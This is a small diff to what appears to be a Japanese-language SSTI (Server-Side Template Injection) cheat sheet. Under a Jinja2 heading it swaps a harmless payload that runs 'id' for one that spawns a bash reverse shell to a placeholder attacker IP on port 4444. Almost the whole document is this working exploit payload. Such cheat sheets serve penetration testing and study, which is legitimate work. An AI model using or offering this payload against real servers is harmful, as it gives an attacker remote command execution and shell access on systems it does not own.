@@ -13,5 +13,5 @@ Server-Side Template Injectionの略で、Webアプリケーションの脆弱�
 
 ## Jinja2
 ```python
-{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
+{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('bash -c "bash -i >& /dev/tcp/<YOUR IP>/4444 0>&1"').read() }}
 ```
